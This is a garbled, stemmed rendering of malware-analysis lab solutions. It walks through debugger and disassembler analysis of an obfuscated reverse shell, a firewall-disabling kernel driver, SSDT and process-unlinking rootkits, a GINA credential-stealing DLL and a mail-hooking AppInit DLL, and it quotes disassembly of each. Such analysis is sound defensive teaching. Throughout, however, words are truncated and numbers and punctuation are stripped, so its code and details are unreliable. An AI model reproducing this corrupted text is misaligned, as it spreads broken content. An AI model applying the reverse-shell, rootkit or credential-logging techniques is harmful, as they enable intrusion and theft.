ebpvaraf h mov ebpvara h mov ebpvarad ah f mov ebpvarac h mov ebpvarab h mov ebpvaraa h mov ebpvara h b mov ebpvara h mov ebpvara h mov ebpvara h mov ebpvara h mov ebpvara e mov ebpstr fh mov ebpvarf h c mov ebpvar ch mov ebpvard eh aa mov ebpvarc h b mov ebpvarb h b mov ebpvara h bf mov ebpvar code build two ascii string move charact onto stack follow null termin popular method string obfusc obfusc string referenc first variabl string give us full nulltermin ascii string singlestep move look sign string creat stack lowerright pane stop execut xc rightclick ebp select follow dump scroll first string ebpb see string qazwsxedc creat second string creat ebpa name oclex filenam checkaft string creat see call getmodulefilenamea exampl c function call within labex malwar x tri analyz function ollydbg well find rather complic examin ida pro well see c runtim librari function strrchr ollydbg miss due lack symbol support load binari ida pro let ida pro use flirt signatur detect correctli identifi api shown shown exampl c ida pro label strrchr properli ollydbg call dsgetmodulefilenamea e push ch ch lea ecx ebpstr push ecx str call strrchr let verifi set breakpoint call x see two argument push stack first forward slash second valu return getmodulefilenamea call would current name execut malwar search backward forward slash xc charact attempt get name rather full path execut execut stepov call strrchr see eax point string labex next function call xc reveal situat similar strrchr ida pro identifi function strcmp shown exampl c exampl c ida pro label strcmp properli ollydbg f mov ebpstr eax mov edx ebpstr add edx mov ebpstr edx b mov eax ebpstr e push eax str f lea ecx ebpstr push ecx str call strcmp well determin string compar set breakpoint call strcmp x breakpoint hit see two string sent strcmp call first pointer getmodulefilenamea call increment one account forward slash oclex decod string earlier stringsmatch eax contain test eaxeax set zero flag true execut go xc condit fals look like program exit explain malwar termin tri execut earlier malwar must name oclex order properli execut let renam binari oclex set breakpoint xc analysi correct malwar exit breakpoint hit success breakpoint hit continu analysi ollydbg decod xor encod string wsastartup wsasocket import assum network function go take place next major function call xbd function x let set breakpoint x inspect stack argument function call two argument pass function stack buffer encod string string qazwsxedc key string stepinto function step call x pass key string strlen return xc move ebp next ebp initi ollydbg note loop progress make sens sinc ebp counter increment xda compar x xe loop continu execut see key string go idiv mov instruct sequenc shown exampl c exampl c string decod function e cmp ebpvar h ea jge short locd ec mov edx ebparg ef add edx ebpvar f movsx ecx byte ptr edx f mov eax ebpvar fe cdq ff idiv ebpvar mov eax ebpstr movsx edx byte ptr eaxedx c xor ecx edx e mov eax ebpvar mov ebpeaxvar cl b jmp short locd get index string notic use edx idiv instruct use modulo allow malwar loop stringin case encod string length longer key string see interest xor set breakpoint xf see valu point edx move ecx tell us valu get xore later function click follow dump edx see pointer first argument function call encod string ecx contain x first byte encod string set breakpoint see xore first iter loop see edx contain x first byte key string see ecx contain x let execut loop time tri make sens string decod click play time see string wwwprac could start domain malwar tri commun let continu var ebp counter variabl equal x jge short xd taken final string place eax wwwpracticalmalwareanalysiscom happen length x function return main function function decod string wwwpracticalmalwareanalysiscom use multibyt xor loop string qazwsxedc back main function see eax pass gethostbynam call valu return ip address popul sockaddrin structur next see call ntoh argument xf decim argument move sockaddrin structur along x repres afinet code internet socket sockaddrin structur next call connect malwar wwwpracticalmalwareanalysiscom tcp port connect succe malwar continu execut xa fail malwar sleep second go back begin main function repeat process use netcat apatedn fool malwar connect back ip control stepinto function call made xa stepinto x see two function call xe anoth exampl ollydbg identifi system call memset wherea ida pro identifi thefunct next see call createprocessa xe shown exampl c call structur popul well turn ida pro shed light what go revers shell analysi appear revers shell creat use method that popular among malwar author method startupinfo structur pass createprocessa manipul createprocessa call run cmdex window suppress isnt visibl user attack call createprocessa socket creat connect establish remot server socket tie standard stream stdin stdout stderr cmdex exampl c show method revers shell creation action exampl c creat revers shell use createprocessa startupinfo structur b mov ebpstartupinfowshowwindow swhide mov edx ebp socket mov ebpstartupinfo hstdinput edx mov eax ebpstartupinfohstdinput mov ebpstartupinfo hstderror eax mov ecx ebpstartupinfohstderror mov ebpstartupinfo hstdoutput ecx lea edx ebpprocessinform push edx lpprocessinform lea eax ebpstartupinfo push eax lpstartupinfo b push lpcurrentdirectori push lpenviron f push dwcreationflag push binherithandl push lpthreadattribut push lpprocessattribut push offset commandlin cmd c push lpapplicationnam e call ds createprocessa startupinfo structur manipul paramet pass createprocessa see createprocessa go run cmdex pass paramet wshowwindow member structur set swhide hide cmdex window launch see standard stream startupinfo structur set socket directli tie standard stream socket cmdex iti launch data come socket sent cmdex output gener cmdex sent socket summari determin malwar simpl revers shell obfusc string must renam oclex run success string obfusc use stack multibyt xor chapter cover dataencod techniqu like detaillab solut short answer import tabl contain kerneldl netapidl dlldll dlldll malwar dynam load userdl dlldll three dll request base address x dlldll load x dlldll load x dlldll load x may slightli differ machin dllprint call print dll mysteri data follow content global variabl dllreturnj return filenam temptxt pass call writefil labex get buffer call netschedulejobadd dllgetstructur dynam resolv mysteri data current process identifi mysteri data handl open temptxt file mysteri data locat memori string ping wwwmalwareanalysisbookcom select manual load load dll ida pro type new imag base address prompt case address x detail analysi start examin import tabl labex contain kerneldl netapidl dlldll dlldll next load labex ida pro look call loadlibrari check string push stack call see two crossrefer loadlibrari push userdl dlldll respect dll may load dynam runtim check base address request dll use peview shown figur c load dlldll peview click theimageoptionalhead look valu imag base shown figur repeat process dlldll dlldll see request base address x figur c find request base address peview use memori map locat dll next want figur memori address three dll load runtim dlldll dlldll load immedi theyr import tabl sinc dlldll load dynam need run loadlibrari function locat x load lab exe ollydbg set breakpoint x click play breakpoint hit step call loadlibrari point three dll load labex bring memori map select view memori memori map shown figur c may appear slightli differ machin see dlldll get prefer base address x see dlldll didnt get prefer base address dlldll alreadi load locat dlldll load x final see dlldll load xfigur c use ollydbg memori map examin dll load locat exampl c show call export dlldll dlldll exampl c call export dlldll dlldll labex call ds dllprint c call ds dllprint call ds dllreturnj mov ebphobject eax b push lpoverlap lea eax ebpnumberofbyteswritten push eax lpnumberofbyteswritten push h nnumberofbytestowrit push offset amalwareanalysi malwareanalysisbookcom mov ecx ebphobject b push ecx hfile c call ds writefil start exampl c see call dllprint export dlldll disassembl dlldll ida pro see function print dll mysteri data follow content global variabl dword examin crossrefer dword see access dllmain return valu call getcurrentprocessid move therefor conclud dllprint print current process id determin dll first load processin exampl c see call two export dlldll dllprint dllreturnj disassembl dlldll ida pro examin dllprint see print dll mysteri data follow content global variabl dwordb examin crossrefer dwordb see access dllmain handl createfilea move createfilea function open file handl temptxt function creat doesnt alreadi exist dllprint appar print valu handl temptxt look dllreturnj export find return handl dllprint print exampl c handl move hobject pass writefil defin malwareanalysisbookcom written writefil labex dlldll load call loadlibrari follow dynam resolut dllprint dllgetstructur use getprocaddress first call dllprint print dll mysteri data follow content global variabl found xbc check crossrefer global variabl see initi dllmain string ping wwwmalwareanalysisbookcom memori locat string print dllgetstructur appear return pointer global dwordba unclear data locat dllmain appear initi sort structur locat use data string sinc dllgetstructur set pointer structur need see labex use data figur content structur exampl c show call dllgetstructur exampl c call dllgetstructur follow netschedulejobadd labex lea edx ebpbuff push edx call ebpvar dllgetstructur add esp b lea eax ebpjobid e push eax jobid f mov ecx ebp buffer push ecx buffer push servernam call netschedulejobadd appear result call structur point buffer issubsequ pass netschedulejobadd view msdn page netschedulejobadd tell us buffer pointer atinfo structur appli structur ida pro atinfo structur appli data dlldll first load dlldll ida pro press insert key within structur window add standard structur atinfo next go dwordba memori select edit struct var click atinfo caus data readabl shown exampl c see schedul job set ping malwareanalysisbookcom everi day week exampl c atinfo structur mov strubacommand offset widecharstr ping www c mov strubajobtim eeh mov strubadaysofmonth mov strubadaysofweek fh mov strubaflag h specifi new imag base ida pro load dlldll ida pro differ locat check manual load box load dll field say pleas specifi new imag base type ida pro rest adjust offset ollydbg load dll malwar summari lab demonstr determin three dll load lab exe use ollydbg load dll ida pro perform full analysi figur mysteri data print malwar mysteri data current process identifi mysteri data handl open temptxt mysteri data locat memori string ping wwwmalwareanalysisbookcom final appli window atinfo structur within ida pro aid analysi dlldll lab solut short answer run procmon monitor program see call write registri regsetvalu valu hklmsoftwaremicrosoftcryptographyrngse indirect chang made call createservicea program also make direct chang registri kernel go undetect procmon set breakpoint see happen kernel must open execut within instanc windbg run virtual machin also debug kernel anoth instanc windbg host machin labex stop virtual machin first use drvobj command get handl driver object contain pointer unload function next set breakpoint unload function within driver breakpoint trigger restart labex program creat servic load driver driver code creat modifi exist registri key registrymachin softwarepoliciesmicrosoftwindowsfirewallstandardprofil registrymachinesoftwarepoliciesmicrosoftwindowsfirewalldomainprofil set registri key disabl window xp firewal detail analysi begin basic static analysi examin execut see import standard one includ everi execut import interest openscmanagera openservicea controlservic startservicea createservicea indic program creat servic probabl start manipul servic appear littl addit interact system string output reveal interest string first cwindowssystemlabsi suggest labsysprob contain code servic examin driver file see import three function first function ketickcount includ almost everi driver ignor two remain function rtlcreateregistrykey rtlwriteregistryvalu tell us driver probabl access registri driver file also contain number interest string follow enablefirewal registrymachinesoftwarepoliciesmicrosoftwindowsfirewallstandardprofil registrymachinesoftwarepoliciesmicrosoftwindowsfirewalldomainprofil registrymachinesoftwarepoliciesmicrosoftwindowsfirewal registrymachinesoftwarepoliciesmicrosoft string look lot like registri key except start registrymachin instead one usual registri root key hklm access registri kernel prefix registrymachin equival access hkeylocalmachin userspac program internet search reveal set enablefirewal valu disabl builtin window xp firewal sinc string suggest malwar write registri open procmon test hypothesi show sever call function read registri one call write registri regsetvalu valu hklmsoftwaremicrosoftcryptographyrngse registri valu chang time meaningless malwar analysi sinc kernel code involv need make sure driver isnt modifi registri covertli next open execut navig main function shown exampl c see make four function call exampl c main method labex push ffh dwdesiredaccess push lpdatabasenam b push lpmachinenam call dsopenscmanagera establish connect servic control manag specifi comput open specifi databas mov edi eax test edi edi jnz short loc pop edi add esp ch retn h loc push esi push lppassword push lpservicestartnam push lpdepend push lpdwtagid push lploadordergroup b push offset binarypathnam cwindowssystemlabsi push dwerrorcontrol push dwstarttyp push dwservicetyp push fffh dwdesiredaccess b push offset servicenam lab push offset servicenam lab push edi hscmanag call dscreateservicea first call openscmanagera get handl servic manag call createservicea creat servic call lab call createservicea tell us servic use code cwindowssystemlabsi servic type servicekerneldriv mean file load kernel call createservicea fail code call openservicea servic name shown exampl c open handl lab servic createservicea call fail servic alreadi exist exampl c call openservicea get handl servic lab push fffh dwdesiredaccess push offset servicenam lab c push edi hscmanag call dsopenservicea next program call startservicea start servic shown exampl c final call controlservic second paramet controlservic type control messag sent case valu x look document find mean servicecontrolstop unload driver call driver unload function exampl c call controlservic labex push lpserviceargvector b push dwnumservicearg push esi hservic e call dsstartservicea test esi esi jz short loc lea eax esphservicestatu c push eax lpservicestatu push dwcontrol f push esi hservic call dscontrolservic send control code win servic view labsi ida pro tri analyz driver windbg open driver ida pro examin driverentri function first open driver navig entri point see code exampl c exampl c code entri point labsi mov edi edi b push ebp c mov ebp esp e call sub pop ebp jmp sub function entri point driver driverentri function compil insert wrapper code around driverentri real driverentri function locat sub shown exampl c main bodi driverentri function appear move offset valu memori locat otherwis doesnt make function call interact system exampl c driverentri routin labsi mov edi edi push ebp mov ebp esp b mov eax ebparg e mov dword ptr eaxh offset loc xor eax eax pop ebp retn analyz labsi windbg use windbg examin labsi see happen controlservic call unload labsi code userspac execut load labsi immedi unload use kernel debugg run malici execut driver yet memori wont abl examin wait malici execut finish execut driver alreadi beenunload memori order analyz labsi windbg load memori well load execut windbg within virtual machin set breakpoint time driver load unload controlservic call follow command bp start program wait breakpoint hit breakpoint hit present follow inform windbg breakpoint hit eaxffc ebxffdc ecxdefbd edx esi edif eip espff ebpffc iopl nv ei pl nz na pe nc csb ss ds es fsb gs efl imagex program stop breakpoint move virtual machin order connect kernel debugg get inform labsi open anoth instanc windbg select file kernel debug pipe set pipecom baud rate connect instanc windbg run host machin kernel guest machin know servic call lab get driver object use drvobj command shown exampl c exampl c locat devic object lab kd drvobj lab driver object b load symbol fc labsi labsi error modul load complet symbol could load labsi driverlab driver extens list id addr devic object list output drvobj command give us address driver object devic list devic object list know driver devic access userspac applic note resolv difficulti locat servic name get list driver object current kernel object driver commandonc address driver object view use dt command shown exampl c exampl c view driver object labsi windbg kd dt driver object b nt driver object x type x size x deviceobject null x flag x xc driverstart xfc x drivers xe x driversect xbc x driverextens xbc driver extens xc drivernam unicod string driverlab x hardwaredatabas xae unicod string registrymachin hardwaredescriptionsystem x fastiodispatch null xc driverinit xfc long x driverstartio null x driverunload xfc void x majorfunct xfa long ntiopinvaliddevicerequest tri identifi function call driver unload inform offset x driverunload shown set breakpoint use follow command kd bp xfc set breakpoint resum run kernel return version windbg run execut virtual machin resum well immedi entir guest os freez kernel debugg hit kernel breakpoint point go kernel debugg step code see program call rtlcreateregistrykey function three time creat sever registri key call rtlwriteregistryvalu twice set enablefirewal valu two place disabl window xp firewal kernel way difficult secur program detect unload function xfc long complex would difficult analyz windbg mani case easier analyz function ida pro identifi function locat ida pro better job analyz function howev function locat windbg differ function locat ida pro must perform manual calcul order view function ida pro mustcalcul offset function begin file load windbg use lm command follow kd lm start end modul name fc fce lab symbol see file load xfc earlier know unload function locat xfc subtract xfc xfc get offset x use navig unload function ida pro exampl base load address ida pro x navig address x find unload function ida pro use static analysi ida pro confirm discov windbg altern chang base address ida pro select edit segment rebas program chang base address valu x xfc note tri use defer breakpoint use bu imentlab may run troubl windbg chang hyphen underscor encount filenam correct command break entri point driver lab would bu imentlab behavior document anywher may inconsist across version windbglab solut short answer program creat file cwindowssystemmlwxsi use procmon anoth dynam monitor tool see file creat see file disk hidden program kernel compon store file resourc section written disk load kernel servic program rootkit design hide file use ssdt hook overwrit entri ntquerydirectoryfil use prevent display file begin mlwx casesensit directori list detail analysi look import section execut see import close servicehandl createservicea openscmanagera startservicea tell us program creat start servic program also call createfil writefil know write file point also see call loadresourc sizeofresourc tell us program someth resourc section labex recogn program access resourc section use resourc hacker examin resourc section see file contain anoth pe header within resourc section shown figur c probabl anoth file malici code labex use next run program find creat file servic use procmon see program creat file cwindowssystem creat servic use file execut file contain kernel code load os next find file program creat order analyz determin kernel code howev look cwindowssystem find there noth see procmon file creat call would delet file base fact file doesnt appear dont see delet adriv involv suspici deal rootkit figur c execut file store resourc section labex find rootkit order continu investig want check see kernel driver load use sc command check statu servic run kernel driver shown exampl c exampl c use sc command get inform servic c sc queri ws driver servicenam ws driver type kerneldriv state run stoppablenotpausableignoresshutdown winexitcod x serviceexitcod x checkpoint x waithint x queri servic name ws driver specifi call createservicea see servic still run tell us kernel code memori someth fishi go driver still run disk determin what go connect kernel debugg virtual machin check see driver actual load use lm command see entri match filenam creat labex fcd fcdd mlwx deferredw certain driver load memori filenam mlwxsi file appear disk suggest might rootkit next check ssdt modifi entri shown exampl c exampl c excerpt ssdt one entri modifi rootkit kd dd dwokeservicedescriptort l dbc cb cb ce e dcc ac fcd bde fca ddc c cdc fc see entri memori locat clearli outsid bound ntoskrnl modul within load mlwxsi driver determin normal function replac revert virtual machin rootkit instal see function store offset ssdt overwritten case function ntquerydirectoryfil versatil function retriev inform file directori use findfirstfil findnextfil travers directori structur function also use window explor display file directori rootkit hook function could hide file would explain cant find mlwxsi weve found function hook ssdt must analyz function examin hook function look close function call instead ntquerydirectoryfil well call patchfunct malici patchfunct must work interfac origin function first check document origin function find ntquerydirectoryfil technic undocu accord microsoft quick internet search provid inform need ntquerydirectoryfil function flexibl one lot differ paramet determin return want look malici function see done request set breakpoint patchfunct discov first thingit call origin ntquerydirectoryfil origin paramet shown exampl c exampl c assembl list patchfunct fcd ff push dword ptr ebph fcd ffc push dword ptr ebpch fcd ff push dword ptr ebph fcd ff push dword ptr ebph fcdc ff push dword ptr ebph fcdf push esi fcda ff push dword ptr ebph fcda ff push dword ptr ebph fcda ff push dword ptr ebph fcda ffc push dword ptr ebpch fcdac ff push dword ptr ebp fcdaf e call mlwxx fcd note probabl complet clear exampl c function call ntquerydirectoryfil howev singlestep call function see goe anoth section file jump ntquerydirectoryfil ida pro call would label ntquerydirectoryfil disassembl includ windbg much less sophist ideal would file view ida pro debug cant find file hidden patchfunct check eighth paramet fileinformationclass valu return ntquerydirectoryfil origin return valu also check return valu ntquerydirectoryfil valu ninth paramet returnsingleentri patchfunct look certain paramet paramet dont meet criteria function exactli origin ntquerydirectoryfil paramet meet criteria patchfunct chang return valu interest examin happen call patchfunct correct paramet set breakpoint patchfunct set breakpoint patchfunct break everi time function call interest function call perfect time use condit breakpoint breakpoint hit paramet patchfunct match criteria set breakpoint patchfunct breakpoint hit valu returnsingleentri follow kd bp fcd dwoespx els gcnote window explor open directori might see breakpoint hit differ thread could annoy your tri analyz function make easier analyz close window explor window use dir command command line trigger breakpoint code filter interest call see anoth function store offset xfcd although isnt automat label windbg determin rtlcomparememori look disassembl step function call code exampl c show call rtlcomparememori exampl c comparison filenam determin whether rootkit modifi return inform ntquerydirectoryfil fcdca push fcdcc adcf push offset mlwxxa fcda fcdd de lea eaxesieh fcdd push eax fcdd db xor blbl fcdd ffdcf call dword ptr mlwxx fcd fcddd f cmp eax fcde jne mlwxxf fcdf see patchfunct compar shown exampl c first paramet rtlcomparememori eax store offset esieh offset filenam earlier disassembl saw esi fileinform contain inform fill ntquerydirectoryfil examin document ntquerydirectoryfil see filebothdirinform structur offset xe filenam store wide charact string could also use windbg tell us store see store locat esieh use db command shown exampl c reveal filenam installerh exampl c examin first argument rtlcomparememori kd db esi ae e c c instal ae f bb f e rh np ae c c db cb e c f e gfupnp ae c e c f e c pnpthe operand comparison fix locat fcda use db command view well exampl c show second paramet rtlcomparememori store letter mlwx remind us driver mlwxsi exampl c examin second argument rtlcomparememori kd db fcda fcda c mlwx fcda fcda call rtlcomparememori specifi size byte repres four charact wide charact string code compar everi file see start four charact mlwx pretti good idea driver hide file begin mlwx hide file discov filenam patchfunct oper analyz chang return valu ntquerydirectoryfil examin document ntquerydirectoryfil see fileinform structur seri filebothdirinform structur first field filebothdirinform structur offset point next filebothdirinform shown figur c patchfunct manipul field hide certain file directori list move offset forward point next entri current entri filenam begin mlwx figur c show return valu ntquerydirectoryfil look like directori contain three file one filebothdirinform structur file normal first structur would point second second would point third rootkit modifi structur first structur point third therebi hide middl structur trick ensur file begin mlwx skip hidden directori listingsfigur c seri filebothdirinform structur modifi middl structur hidden recov hidden file identifi program hide file tri obtain origin file use driver order perform addit analysi sever way disabl servic start driver reboot reboot code wont run file wont hidden extract file resourc section execut file instal access file even though avail directori list hook ntquerydirectoryfil prevent file shown directori list file still exist exampl could copi file use do command copi mlwxsi newfilenamesi newfilenamesi file would hidden option simpl enough first best disabl driver driver disabl first search system file begin mlwx case file hidden mlwxsi driver none case open mlwxsi ida pro see small analyz make sure driver isnt anyth els awar see driverentri routin call rtlinitunicodestringwith keservicedescriptort ntquerydirectoryfil call mmgetsystemroutineaddress find offset two address next look entri ssdt ntquerydirectoryfil overwrit entri address patchfunct doesnt creat devic doesnt add function handler driver objectlab solut short answer userspac program load driver pop advertis everi second driver hide process unlink process environ block peb system link list program run easi way stop without reboot kernel compon respond deviceiocontrol request unlink process made request link list process order hide process user detail analysi begin basic static analysi file analyz driver file see follow import iofcompleterequest iodeletedevic iodeletesymboliclink rtlinitunicodestr iogetcurrentprocess iocreatesymboliclink iocreatedevic ketickcount import iogetcurrentprocess one provid much inform import simpli requir driver creat devic access user space call iogetcurrentprocess tell us driver either modifi run process requir inform next copi driver file cwindowssystem doubleclick execut run see popup ad one lab solut examin system first check see servic success instal verifi malici sy file use part servic simultan notic second program pop advertis everi second open task manag effort termin program see thatth program isnt list list process explor either program continu open advertis there easi way stop process list cant stop kill process attach debugg process program doesnt show process list windbg ollydbg point choic revert recent snapshot reboot hope program isnt persist reboot stop analyz execut ida pro ida pro navig winmain examin function call see follow openscmanag createservic startservic closeservicehandl createfil deviceiocontrol oleiniti cocreateinst variantinit sysallocstr ecxxc sleep oleuniniti winmain logic broken two section first section consist openscmanag deviceiocontrol includ function load send request kernel driver second section consist remain function show usag com object point dont know target call ecxxc well come back later look call detail see program creat servic call process helper load kernel driver cwindowssystemlab sy start process helper servic load labsi kernel open handl prochelp open handl kernel devic creat prochelp driver need look care call deviceiocontrol shown exampl c input output paramet pass argument sent kernel code need analyz separ exampl c call deviceiocontrol labex pass request toth labsi driver c lea ecx espchbytesreturn push lpoverlap push ecx lpbytesreturn push noutbuffers push lpoutbuff push ninbuffers push lpinbuff b push abcdefh dwiocontrolcod push eax hdevic call dsdeviceiocontrol notic call deviceiocontrol lpoutbuff lpinbuff set null unusu mean request send inform kernel driver kernel driver send inform back also notic dwiocontrolcod xabcdef pass kernel driver well revisit look kernel driver remaind file nearli ident com exampl lab solut except call navig function insid loop run continu sleep second call analyz driver next open kernel file ida pro shown exampl c see call iocreatedevic creat devic name deviceprochelp exampl c labsi creat devic access user space push offset adeviceprochelp deviceprochelp f lea eax ebpvarc push eax call edi rtlinitunicodestr mov esi ebparg lea eax ebpvar b push eax c push e push h push h lea eax ebpvarc push eax push b push esi c call dsiocreatedevic shown exampl c function call iocreatesymboliclink creat symbol link name dosdevicesprochelp user space program accessexampl c labsi creat symbol link make easier user space applic access handl devic push offset adosdevicespr dosdevicesprochelp lea eax ebpvar push eax mov dword ptr esih offset loc mov dword ptr esih offset loca call edi rtlinitunicodestr lea eax ebpvarc push eax e lea eax ebpvar push eax call dsiocreatesymboliclink find driver memori windbg either run malwar start servic load kernel driver memori know devic object deviceprochelp start order find function prochelp execut must find driver object done devobj command shown exampl c output devobj tell us driverobject store exampl c find devic object prochelp driver kd devobj prochelp devic object afd prochelp driverprocess helper driverobject current irp refcount type flag dacl ebcc devext devobjext af extensionflag devic queue busi driverobject contain pointer function call userspac program access devic object driverobject store data structur call driverobject use dt command view driver object label shown exampl c exampl c examin driver object labsi use windbg kd dt nt driver object x type x size x deviceobject xafd devic object x flag x xc driverstart xfc x drivers xe x driversect xbd x driverextens xb driver extens xc drivernam unicod string driverprocess helper x hardwaredatabas xae unicod string registrymachin hardwaredescriptionsystem x fastiodispatch null xc driverinit xfccd long x driverstartio null x driverunload xfca void x majorfunct xfc long code contain sever function pointer note includ driverinit driverentri routin analyz ida pro driverunload call driver unload look driverunload ida pro see delet symbol link devic creat driverentri program analyz function major function tabl next examin major function tabl often interest driver code implement window xp allow xc possibl major function code view entri major function tabl use dd command kd dd ax lc ad fc fa fc fa ae fa fa fa fa af fa fa fa fa b fa fa fc fa b fa fa fa fa b fa fa fa fa b fa fa fa fa entri tabl repres differ type request driver handl see entri tabl function xfa entri tabl valu xfa repres request type driver handl verifi need find function could view disassembl window function name tell us shown kd ln fa fa nt iopinvaliddevicerequest f ntiopgetdeviceattachmentbas exact match ntiopinvaliddevicerequest type inform function xfa name iopinvaliddevicerequest mean handl invalid request driver doesnt handl remain function major function tabl offset xe contain thefunction interest examin wdmh find offset xe store function creat close deviceiocontrol function first look creat close function offset major function tabl notic entri major function tabl point function xfc look function see simpli call iofcompleterequest return tell os request success noth els remain function major function tabl one handl deviceiocontrol request interest look deviceiocontrol function see manipul peb current process exampl c show code handl deviceiocontrol exampl c driver code handl deviceiocontrol request mov edi edi push ebp mov ebp esp b call dsiogetcurrentprocess mov ecx eaxch add eax h c mov edx eax e mov ecx edx mov ecx eax mov eax eax mov ecx eax mov ecx ebpirp irp b dword ptr ecxh f dword ptr ecxch xor dl dl priorityboost call dsiofcompleterequest b xor eax eax pop ebp e retn first thing deviceiocontrol function call iogetcurrentprocess return eprocess structur process issu call deviceiocontrol function access data offset x access next dword offset xc use dt command discov listentri store offset x xc peb structur shown exampl c exampl c examin eprocess structur windbgkd dt nteprocess x pcb kprocess xc processlock expushlock x createtim larg integ x exittim larg integ x rundownprotect ex rundownref x uniqueprocessid ptr void x activeprocesslink list entri x quotausag uintb xc quotapeak uintb know function access listentri structur look close listentri access listentri structur doublelink list two valu first blink point previou entri list second flink point next entri list see read listentri structur also chang structur shown exampl c exampl c deviceiocontrol code modifi eprocess structur mov ecx eaxch add eax h c mov edx eax e mov ecx edx mov ecx eax mov eax eax mov ecx eax instruct obtain pointer next entri list instruct obtain pointer previou entri list instruct overwrit blink pointer next entri point previou entri prior blink pointer next entri point current entri instruct overwrit blink pointer skip current process instruct perform step except overwrit flink pointer previou entri list skip current entri rather chang eprocess structur current process code exampl c chang eprocess structur process front behind link list process six instruct hide current process unlink link list load process shown figur c figur c process remov process list hidden tool task manag os run normal process pointer process howev figur c process hidden rootkit os iter link list process hidden process alway skip might wonder process continu run without problem even though oss list process answer rememb process simpli contain variou thread run insid thread schedul execut cpu long thread still properli account os schedul process continu run normallab solut short answer malwar extract drop file msginadl onto disk resourc section name tgad malwar instal msginadl gina dll ad registri locat hklmsoftwaremicrosoftwindow ntcurrentversionwinlogonginadl caus dll load system reboot malwar steal user credenti perform gina intercept msginadl file abl intercept user credenti submit system authent malwar log stolen credenti systemrootsystemmsutilsi usernam domain password log file timestamp malwar drop instal must system reboot gina intercept begin malwar log credenti user log log back see credenti log file detail analysi begin basic static analysi see string ginadl softwaremicrosoftwindow ntcurrentversionwinlogon lead us suspect might gina intercept malwar examin import see function manipul registri extract resourc section see resourc extract import function examin file structur load labex peview shown figur c figur c labex peview show tgad resourc section examin pe file format see resourc section name tgad click section peview see tgad contain embed pe file next perform dynam analysi monitor malwar procmon set filter labex launch malwar see creat file name msginadl disk directori malwar launch malwar insert path msginadl registri key hklmsoftwaremicrosoftwindow ntcurrentversionwinlogonginadl dll load winlogon system reboot extract tgad resourc section labex use resourc hacker compar msginadl find two ident next load labex ida pro confirm find see main function call two function sub extract tgad resourc section msginadl sub set gina registri valu conclud labex instal msginadl load winlogon system startup analysi msginadl well begin analysi msginadl look string output shown exampl c exampl c string output msginadl ginadl softwaremicrosoftwindow ntcurrentversionwinlogonmsginadl un dm pw old msutilsi string list contain appear log messag could use log user credenti gina intercept malwar string msutilsi interest determin signific later lab examin msginadl export see mani function begin prefix wlx recal chapter gina intercept malwar must contain dll export requir gina well analyz function ida pro begin load malwar ida pro analyz dllmain shown exampl c exampl c dllmain msginadl get handl msginadl cmp eax dllprocessattach jnz short locb e call dsgetsystemdirectoryw lea ecx espchlibfilenam push offset string msgina push ecx lpstring e call dslstrcatw lea edx espchlibfilenam push edx lplibfilenam call dsloadlibraryw f xor ecx ecx mov hmodul eax shown exampl c dllmain first check fdwreason argument argument pass indic dll entrypoint function call malwar check dllprocessattach call process start loadlibrari use load dll particular dllmain call dllprocessattach code begin call code get handl msginadl window system directori via call loadlibraryw note msginadl window dll implement gina wherea msginadl malwar author gina intercept dll name msgina design deceiveth malwar save handl global variabl ida pro name hmodul use variabl allow dll export properli call function msginadl window dll sinc msginadl intercept commun winlogon msginadl must properli call function msginadl system continu oper normal next analyz export function begin wlxloggedonsa shown exampl c exampl c wlxloggedonsa export pass msginadl wlxloggedonsa proc near push offset awlxloggedon wlxloggedonsa call sub jmp eax wlxloggedonsa export short simpli pass true wlxloggedonsa contain msginadl two wlxloggedonsa function version exampl c msginadl origin msginadl function exampl c begin pass string wlxloggedonsa sub jump result sub function use hmodul handl msginadl string pass case wlxloggedonsa use getprocaddress resolv function msginadl malwar doesnt call function simpli resolv address wlxloggedonsa msginadl jump function seen jump call wlxloggedonsa code set stack frame push return address onto stack wlxloggedonsa msginadl call return execut directli winlogon return address stack stack code exampl c call continu analyz export see oper like wlxloggedonsa passthrough function except wlxloggedoutsa contain extra code wlxloggedoutsa call user log system export begin resolv wlxloggedoutsa within msginadl use getprocaddress call export also contain code shown exampl c exampl c wlxloggedoutsa call credenti log function subfc push offset aunsdmspwsold un dm pw old push dwmessageid call sub code exampl c pass bunch argument format string string pass sub call seem like sub may log function stolen credenti let examin see exampl c show log code contain sub exampl c credentiallog function log msutilsi e call vsnwprintf push offset mode mode push offset filenam msutilsi call wfopen mov esi eax add esp h test esi esi jz locf af lea eax esphdest b push edi b lea ecx espchbuff b push eax b push ecx buffer ba call wstrtime bf add esp c lea edx esphvar c push eax c push edx buffer c call wstrdate cd add esp push eax push offset format push esi file call fwprintf call vsnwprintf fill format string pass wlxloggedoutsa export next malwar open file msutilsi creat insid cwindowssystem sinc winlogon resid msginadl run winlogon process date time record inform log realiz msutilsi use store log credenti driver although name suggest forc malwar log credenti run labex reboot machin log system follow exampl data contain log file creat malwar un user dm malwarevm pw test old null un hacker dm malwarevm pw pssword old null usernam user hacker password test pssword domain malwarevm summari lab solut gina interceptor instal malwar drop dll system instal steal user credenti begin system reboot gina interceptor dll instal run log credenti msutilsi user log systemlab solut short answer labdll contain one export name instal run malwar command line use rundllex labdllinstal malwar copi window system directori spoolvxxdll instal persist appinitdl malwar also tri open labini window system directori doesnt find labini must resid systemrootsystem order malwar run properli malwar instal appinitdl registri valu caus malwar load everi process also load userdl malwar instal inlin hook send function hook check outgo packet email messag contain rcpt string found add addit rcpt line contain malici email account malwar target msimnex thebatex outlookex email client malwar instal hook unless run insid one process ini file contain encrypt email address decrypt labini see contain billymalwareanalysisbookcom see captur network traffic method captur data use wireshark fake mail server outlook express detail analysi begin basic static analysi labdll dll one export name instal malwar contain import manipul registri regsetvalueex chang file system copyfil search process thread list createtoolhelpsnapshot interest string labdll shown exampl c exampl c interest string labdll rcpt thebatex outlookex msimnex send wsockdll softwaremicrosoftwindow ntcurrentversionwindow spoolvxxdll appinitdl labini string appinitdl softwaremicrosoftwindow ntcurrentversionwindow indic malwar might use appinitdl instal persist string labini indic malwar use ini file provid lab examin content labini see appear contain encod encrypt data send wsockdll string may indic malwar use network function unclear dig deeper process name outlookex msimnex thebatex email client combin string rcpt lead us suspect malwar someth email note rcpt smtp command establish recipi email messag next use basic dynam tool like procmon monitor malwar begin tri instal malwar use instal export follow command rundllex labdllinstal procmon set filter process rundllex see malwar creat file name spoolvxxdll window system directori upon inspect see file ident labdll procmon list see malwar add spoolvxxdll list appinitdl caus malwar load everi process load userdl final see malwar attempt open labini window system directori therefor copi ini file window system directori order malwar access itw move analysi ida pro look deepli malwar begin 